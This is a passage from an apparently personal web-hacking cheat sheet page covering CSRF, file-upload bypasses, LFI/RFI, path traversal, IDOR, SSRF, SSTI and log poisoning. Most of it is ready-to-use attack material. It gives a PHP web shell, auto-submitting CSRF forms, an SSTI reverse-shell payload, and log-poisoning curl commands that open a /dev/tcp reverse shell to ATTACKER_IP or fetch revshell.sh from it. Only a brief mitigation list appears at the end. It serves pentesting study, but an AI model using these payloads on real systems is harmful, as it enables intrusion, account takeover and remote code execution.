+<h2 id="-cross-site-request-forgery-csrf">🏴‍☠️ Cross-Site Request Forgery (CSRF)<a hidden class="anchor" aria-hidden="true" href="#-cross-site-request-forgery-csrf">#</a></h2>
+<p>Cross-Site Request Forgery (CSRF) is an attack that tricks a user into performing actions on a web application in which they are authenticated, without their knowledge.</p>
+<h3 id="how-csrf-works">How CSRF Works<a hidden class="anchor" aria-hidden="true" href="#how-csrf-works">#</a></h3>
+<p>The victim logs into a web application, like an online bank. The attacker creates a malicious request, for example to transfer money, and somehow convinces the victim to visit their site or click a link. Since the victim is already authenticated, the request is sent with their credentials, making the action happen without their knowledge.</p>
+<h3 id="csrf-example">CSRF Example<a hidden class="anchor" aria-hidden="true" href="#csrf-example">#</a></h3>
+<pre tabindex="0"><code>&lt;img src=&#34;https://bank.com/transfer?amount=1000&amp;to=attacker_account&#34; /&gt;
+</code></pre><p>Imagine you are pentesting and you find a form to change a user’s email password. You submit it and intercept the POST request with Burp Suite. It looks something like this:</p>
+<pre tabindex="0"><code>POST /change-password HTTP/1.1
+Host: vulnerable.com
+Cookie: session=abcd1234
+Content-Type: application/x-www-form-urlencoded
+
+password=newhackerpassword
+</code></pre><p>The server accepts it because the user is logged in and <strong>there’s no CSRF token</strong>. Here’s where it gets interesting: you can try turning that action into a <strong>GET request</strong> for an easy <strong>CSRF</strong>. Just make a malicious link that does the same thing:</p>
+<pre tabindex="0"><code>&lt;img src=&#34;https://vulnerable.com/change-password?password=newhackerpassword&#34; /&gt;
+</code></pre><blockquote>
+<p>📝 NOTE: <code>&lt;img&gt;</code> is used for <strong>CSRF</strong> because the <strong>browser automatically loads the URL</strong> with the user’s cookies, triggering the action silently without any user interaction.</p></blockquote>
+<p>If the app doesn’t check tokens or enforce POST, anyone who clicks the link or loads the page will have their password changed without noticing.</p>
+<p>If the app only accepts <strong>POST</strong>, you can create a hidden form that submits itself automatically with JavaScript:</p>
+<pre tabindex="0"><code>&lt;form action=&#34;https://vulnerable.com/change-password&#34; method=&#34;POST&#34; id=&#34;csrfForm&#34;&gt;
+  &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#34;newhackerpassword&#34;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#39;csrfForm&#39;).submit();&lt;/script&gt;
+</code></pre><hr>
+<h2 id="-file-upload-vulnerabilities">📂 File Upload Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#-file-upload-vulnerabilities">#</a></h2>
+<h3 id="unrestricted-file-upload">Unrestricted file upload<a hidden class="anchor" aria-hidden="true" href="#unrestricted-file-upload">#</a></h3>
+<p>Happens when an application allows any file to be uploaded without proper validation. This may let an attacker upload malware or malicious scripts to be executed on the server.</p>
+<p><strong>Example:</strong></p>
+<p>Upload a malicious PHP file:</p>
+<pre tabindex="0"><code>&lt;?php
+		echo &#34;&lt;pre&gt;&#34; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;;
+?&gt;
+</code></pre><p>Then access it through the browser and execute a command:</p>
+<pre tabindex="0"><code>http://vulnerable-site.com/uploads/shell.php?cmd=whoami
+</code></pre><h3 id="file-extension-bypass">File extension bypass<a hidden class="anchor" aria-hidden="true" href="#file-extension-bypass">#</a></h3>
+<p>Bypass happens when the filter only checks the extension. Rename or trick the filename in the request.</p>
+<p><strong>Burp Suite interception example:</strong></p>
+<pre tabindex="0"><code>POST /upload HTTP/1.1
+Host: vulnerable-site.com
+Content-Length: 215
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.php.jpg&#34;
+Content-Type: image/jpeg
+&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+
+------WebKitFormBoundary--
+</code></pre><blockquote>
+<p>🚨 <strong>IMPORTANT</strong>: Simply renaming the file may bypass weak extension checks, but most servers also validate the file content or block execution, so additional tricks like double extensions or Content-Type spoofing are often needed.</p></blockquote>
+<h3 id="content-type-spoofing">Content-type spoofing<a hidden class="anchor" aria-hidden="true" href="#content-type-spoofing">#</a></h3>
+<p>Occurs when the server checks only the MIME type header but not the real file content.
+This allows an attacker to hide malicious files by sending an allowed MIME type (For example <code>image/jpeg</code>) while the file actually contains executable code.</p>
+<p><strong>Burp Suite interception example:</strong></p>
+<pre tabindex="0"><code>POST /upload HTTP/1.1
+Host: vulnerable-site.com
+Content-Length: 215
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.php&#34;
+Content-Type: image/jpeg      &lt;-- Fake MIME
+&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;      &lt;-- Malicious PHP
+
+------WebKitFormBoundary--
+</code></pre><hr>
+<h2 id="-path--file-disclosure">📜 Path &amp; File Disclosure<a hidden class="anchor" aria-hidden="true" href="#-path--file-disclosure">#</a></h2>
+<p>Path and file disclosure vulnerabilities allow attackers to <strong>access sensitive files</strong> or <strong>directories</strong> on a server. These problems often happen when the server doesn’t check inputs properly and can reveal settings, code, passwords, or other private information.</p>
+<div style="display: flex; justify-content: center;">
+  <img src="https://conper.xyz/images/hacking/pathfiledisclosure.png" alt="Mi foto" width=65% style="border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;"/>
+</div>
+<h3 id="local-file-inclusion-lfi">Local File Inclusion (LFI)<a hidden class="anchor" aria-hidden="true" href="#local-file-inclusion-lfi">#</a></h3>
+<p><strong>Local File Inclusion</strong> occurs when a web application <strong>includes files</strong> from the local server without proper validation. This can allow an attacker to <strong>read sensitive files</strong> or <strong>execute malicious code</strong> if they can control the input.</p>
+<p><strong>Example:</strong></p>
+<pre tabindex="0"><code>http://example.com/index.php?page=../../../../etc/passwd
+</code></pre><p>Here, an attacker attempts to read the <em><strong>/etc/passwd</strong></em> file on a <strong>Linux</strong> server by manipulating the page parameter.</p>
+<p><strong>Common LFI vectors:</strong></p>
+<ul>
+<li>
+<p>Reading system files (/etc/passwd, C:\Windows\system32\drivers\etc\hosts)</p>
+</li>
+<li>
+<p>Including logs or temporary files to execute code</p>
+</li>
+</ul>
+<pre tabindex="0"><code>http://example.com/index.php?page=../../../../var/log/apache2/access.log
+</code></pre><ul>
+<li>Null byte injection (in older PHP versions)</li>
+</ul>
+<pre tabindex="0"><code>http://example.com/index.php?page=../../../../etc/passwd%00.php
+</code></pre><ul>
+<li>Including session files (/var/lib/php/sessions/)</li>
+</ul>
+<pre tabindex="0"><code>http://example.com/index.php?page=../../../../var/lib/php/sessions/sess_abcdef123456
+</code></pre><p>This could expose sensitive session data stored on the server.</p>
+<p><strong>Using Nikto for LFI Detection</strong></p>
+<p><a href="https://github.com/sullo/nikto"><strong>Nikto</strong></a> is an open-source web server scanner that can detect various vulnerabilities, including <strong>LFI</strong> patterns.</p>
+<p>Basic usage:</p>
+<pre tabindex="0"><code>nikto -h http://example.com
+</code></pre><p>Scans the target for known vulnerabilities, including possible LFI parameters.</p>
+<p>Scan for a specific file inclusion pattern:</p>
+<pre tabindex="0"><code>nikto -h http://example.com/index.php?page= -Tuning 4
+</code></pre><p>-Tuning 4 focuses on file inclusion vulnerabilities.</p>
+<h3 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)<a hidden class="anchor" aria-hidden="true" href="#remote-file-inclusion-rfi">#</a></h3>
+<p><strong>Remote File Inclusion</strong> happens when a web application allows the inclusion of <strong>files from external sources</strong>, such as <strong>URLs</strong>, without validation. <strong>RFI</strong> is particularly dangerous because it can lead to <strong>remote code execution</strong>.</p>
+<pre tabindex="0"><code>http://example.com/index.php?page=http://YOUR_IP/malicious.php
+</code></pre><p>The server may download and execute the <strong>malicious PHP</strong> script hosted on our server.</p>
+<h3 id="path-traversal">Path traversal<a hidden class="anchor" aria-hidden="true" href="#path-traversal">#</a></h3>
+<p><strong>Path traversal</strong> (or <strong>directory traversal</strong>) occurs when an attacker manipulates file paths to access <strong>directories</strong> and <strong>files</strong> outside the intended scope. This typically involves using sequences like ../ to navigate up the directory tree.</p>
+<blockquote>
+<p>📝 Note: <strong>Path traversal</strong> is the technique of navigating directories, while <strong>LFI</strong> uses this technique to actually include and execute local files within the application.</p></blockquote>
+<p>Example:</p>
+<pre tabindex="0"><code>http://example.com/download.php?file=../../../../etc/passwd
+</code></pre><p>By using <code>../</code> sequences, an attacker can reach sensitive <strong>system files</strong> or <strong>application data</strong>.</p>
+<hr>
+<h2 id="-access-control-issues">🔓 Access Control Issues<a hidden class="anchor" aria-hidden="true" href="#-access-control-issues">#</a></h2>
+<p><strong>Access control issues</strong> occur when an application fails to properly enforce who can access what. This can allow attackers to <strong>view</strong>, <strong>modify</strong>, or <strong>perform actions</strong> on <strong>resources</strong> they shouldn’t have access to.</p>
+<h3 id="idor-insecure-direct-object-references">IDOR (Insecure Direct Object References)<a hidden class="anchor" aria-hidden="true" href="#idor-insecure-direct-object-references">#</a></h3>
+<p>When an app uses predictable identifiers (<strong>IDs</strong>, <strong>filenames</strong>, <strong>keys</strong>) to access objects without checking if the current user is allowed.</p>
+<p><strong>Example:</strong></p>
+<pre tabindex="0"><code>https://example.com/profile?id=123
+</code></pre><p>Change it to:</p>
+<pre tabindex="0"><code>https://example.com/profile?id=100
+</code></pre><p>If you get another user&rsquo;s profile, it&rsquo;s an <strong>IDOR</strong>.</p>
+<p><strong>Example with JWT:</strong></p>
+<p>You intercept a request:</p>
+<pre tabindex="0"><code>Authorization: Bearer **eyJhbGciOiJIUzI1NiIsInR5cCI**6...
+Payload: { &#34;user_id&#34;: 42, &#34;role&#34;: &#34;user&#34; }
+</code></pre><p>You decode the <strong>JWT</strong> (using <a href="https://www.jwt.io/"><strong>jwt.io</strong></a> or <strong>Burp extension</strong>), change:</p>
+<pre tabindex="0"><code>&#34;user_id&#34;: 42 → &#34;user_id&#34;: 43
+</code></pre><p>Re-sign the token (if key is guessable or algorithm is <strong>none</strong>), or test if the server doesn’t verify signature.</p>
+<p>If you can access another user’s account/data it’s an <strong>IDOR</strong>.</p>
+<h3 id="bypassing-authorization-checks">Bypassing authorization checks<a hidden class="anchor" aria-hidden="true" href="#bypassing-authorization-checks">#</a></h3>
+<p>Exploiting flaws where the app only checks permissions in the <strong>UI</strong> or <strong>client-side</strong>, but not on the server.</p>
+<p>How to test:</p>
+<ul>
+<li>
+<p>Intercept requests with a proxy like <strong>Burp Suite</strong>.</p>
+</li>
+<li>
+<p>Send the same request as a <strong>lower-privileged</strong> or <strong>unauthenticated user</strong>.</p>
+</li>
+<li>
+<p>Try <strong>deleting</strong>/<strong>modifying</strong> parameters that indicate <strong>role</strong> or <strong>permissions</strong> (role=admin, isAdmin=true).</p>
+</li>
+<li>
+<p>Try direct access to endpoints without visiting them through the normal workflow.</p>
+</li>
+</ul>
+<p><strong>Example:</strong></p>
+<p>Normal user request:</p>
+<pre tabindex="0"><code>POST /upgradeAccount HTTP/1.1
+Host: vulnerable-site.com
+Content-Type: application/json
+
+{&#34;userId&#34;: &#34;101&#34;, &#34;plan&#34;: &#34;basic&#34;}
+</code></pre><p>Modified request:</p>
+<pre tabindex="0"><code>POST /upgradeAccount HTTP/1.1
+Host: vulnerable-site.com
+Content-Type: application/json
+
+{&#34;userId&#34;: &#34;101&#34;, &#34;plan&#34;: &#34;admin&#34;}
+</code></pre><p>If the application <strong>doesn’t check permissions</strong> properly, the user <strong>can gain admin access</strong>.</p>
+<hr>
+<h2 id="-server-side-issues">📡 Server-Side Issues<a hidden class="anchor" aria-hidden="true" href="#-server-side-issues">#</a></h2>
+<h3 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)<a hidden class="anchor" aria-hidden="true" href="#ssrf-server-side-request-forgery">#</a></h3>
+<p><strong>SSRF</strong> occurs when an attacker tricks a server into making <strong>HTTP requests to unintended locations</strong>, often <strong>internal services</strong> that are not exposed externally. The attacker <strong>can access internal systems</strong>, sensitive files, or perform port scanning.</p>
+<p>Example:</p>
+<p>A web app fetches a <strong>URL</strong> provided by the user:</p>
+<pre tabindex="0"><code>GET /fetch?url=http://example.com
+</code></pre><p>If the server doesn’t validate the URL, an attacker could request an internal resource:</p>
+<pre tabindex="0"><code>http://localhost/admin                # Internal admin panel
+http://localhost:22                   # Internal SSH
+http://localhost:3306                 # Internal MySQL
+http://192.168.1.1:8080/status       # Internal network service
+file:///etc/passwd                    # Sensitive local file
+http://localhost/admin/api
+</code></pre><p>The server becomes a proxy for the attacker, potentially exposing internal networks.</p>
+<h3 id="ssti-server-side-template-injection">SSTI (Server-Side Template Injection)<a hidden class="anchor" aria-hidden="true" href="#ssti-server-side-template-injection">#</a></h3>
+<p><strong>Server-Side Template Injection</strong> occurs when user input is rendered directly in a server-side template <strong>without proper sanitization</strong>. This can allow attackers to <strong>execute arbitrary code</strong> on the server.</p>
+<p><strong>How to Check if a Server is Vulnerable:</strong></p>
+<pre tabindex="0"><code>{{7*7}}      # Jinja2/Python
+`${7*7}`     # Some template engines
+</code></pre><p>If the server evaluates the expression instead of printing it literally, it is vulnerable.</p>
+<p>Reading Local Files (Example <strong>Jinja2 - Python</strong>):</p>
+<pre tabindex="0"><code>{{ open(&#39;/etc/passwd&#39;).read() }}
+`${open(&#39;/etc/passwd&#39;).read()}`
+</code></pre><p><strong>Advanced Attacks (Remote Code Execution / Reverse Shell):</strong></p>
+<p>You can use <strong>SSTI</strong> to craft payloads that <strong>run commands</strong> or even open <strong>reverse shells</strong>. For example, a <strong>reverse shell payload</strong> might look like this:</p>
+<pre tabindex="0"><code>{%25+for+x+in+().__class__.__base__.__subclasses__()+%25}
+{%25+if+%22warning%22+in+x.__name__+%25}
+{{x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(request.args.input).read()}}
+{%25endif%25}
+{%25endfor%25}&amp;input=bash+-c+&#39;bash+-i+&gt;&amp;/dev/tcp/YOUR_IP/PORT+0&gt;&amp;1&#39;
+</code></pre><h3 id="log-poisoning">Log Poisoning<a hidden class="anchor" aria-hidden="true" href="#log-poisoning">#</a></h3>
+<p><strong>Log poisoning</strong> is a <strong>server-side attack</strong> technique where an attacker <strong>injects malicious payloads</strong> into server <strong>log files</strong> (<strong>access.log</strong>, <strong>error.log</strong>, <strong>auth.log</strong>, &hellip;).
+If these logs are later included or rendered by a vulnerable application (commonly via Local File Inclusion - LFI), the malicious code can be executed on the server, leading to Remote Code Execution (RCE).</p>
+<p><strong>Requirements for Exploitation:</strong></p>
+<ul>
+<li>
+<p>A way to put <strong>malicious text</strong> into a <strong>server log</strong> (for example, by sending it in the User-Agent, Referer, or part of the URL).</p>
+</li>
+<li>
+<p>A vulnerability, such as <strong>Local File Inclusion</strong> (<strong>LFI</strong>), that lets you open and view the <strong>log file</strong> through the web application.</p>
+</li>
+<li>
+<p>The <strong>log file</strong> must be interpreted as code by the server when opened (for example, if <strong>PHP</strong> code in the <strong>.log</strong> file is executed).</p>
+</li>
+</ul>
+<p><strong>Common Log Locations</strong></p>
+<p>Linux (Apache, Nginx, SSH):</p>
+<pre tabindex="0"><code>/var/log/apache2/access.log (Can be poisoned via User-Agent or X-Forwarded-For)
+/var/log/apache2/error.log
+/var/log/nginx/access.log (Often poisoned via URL path)
+/var/log/auth.log (Username injection if LFI is possible)
+</code></pre><p>Windows (IIS, Event Logs):</p>
+<pre tabindex="0"><code>C:\inetpub\logs\LogFiles
+C:\Windows\System32\winevt\Logs
+</code></pre><p><strong>How the Attack Works</strong></p>
+<h4>1. Identify accessible log files</h4>
+<p>Use LFI fuzzing to find log file paths:</p>
+<pre tabindex="0"><code>wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
+-u &#39;http://example.com/page.php?file=FUZZ&#39; --hl=1 | grep log
+</code></pre><h4>2. Inject malicious code into the log</h4>
+<p>For example, send PHP code as part of a request that will be written to a log file.</p>
+<ul>
+<li>Example 1 – User-Agent injection (Apache)</li>
+</ul>
+<pre tabindex="0"><code>curl &#34;http://example.com/&#34; \
+-A &#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;
+</code></pre><ul>
+<li>Example 2 – X-Forwarded-For header injection</li>
+</ul>
+<pre tabindex="0"><code>curl &#34;http://example.com/&#34; \
+-H &#34;X-Forwarded-For: &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;
+</code></pre><ul>
+<li>Example 3 – URL path injection (Nginx)</li>
+</ul>
+<pre tabindex="0"><code>curl &#34;http://example.com/&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;
+</code></pre><ul>
+<li>Example 4 – SSH auth.log poisoning</li>
+</ul>
+<pre tabindex="0"><code>ssh &#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;@IP
+</code></pre><p>(Fails authentication, but payload is stored in <em><strong>/var/log/auth.log</strong></em>)</p>
+<h4>3. Trigger log file execution via LFI</h4>
+<p>Access the poisoned log:</p>
+<pre tabindex="0"><code>curl &#34;http://example.com/page.php?file=/var/log/apache2/access.log&amp;cmd=id&#34;
+</code></pre><h4>4. Gain reverse shell</h4>
+<p>Inject reverse shell payload:</p>
+<pre tabindex="0"><code>curl &#34;http://example.com/page.php?file=/var/log/apache2/access.log&amp;cmd=bash+-c+&#39;exec+bash+-i+%26&gt;/dev/tcp/ATTACKER_IP/4444+&lt;%261&#39;&#34;
+</code></pre><p><strong>Alternative Method</strong></p>
+<p>Instead of executing directly, upload or download a malicious script via log poisoning:</p>
+<pre tabindex="0"><code>curl &#34;http://example.com/&#34; -A &#34;&lt;?php system(&#39;wget http://ATTACKER_IP/revshell.sh&#39;); ?&gt;&#34;
+curl &#34;http://example.com/&#34; -A &#34;&lt;?php system(&#39;chmod +x revshell.sh&#39;); ?&gt;&#34;
+curl &#34;http://example.com/&#34; -A &#34;&lt;?php system(&#39;./revshell.sh&#39;); ?&gt;&#34;
+</code></pre><p><strong>Mitigation</strong></p>
+<ul>
+<li>Do not allow log files to be accessed via the web.</li>
+<li>Never execute or include log files as code.</li>
+<li>Keep logs outside the web server’s root directory.</li>
+</ul>
+<!-- 
+### Deserialization attacks
+
+Happens when a server reads untrusted data. If an attacker controls it, they can change objects and run code.
+
+UNDER CONSTRUCTION
+
+--->
+<hr>
+
+
+</div>
+
+
+ 
+
+
+
+
+
+
+
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://conper.xyz/">Conper</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
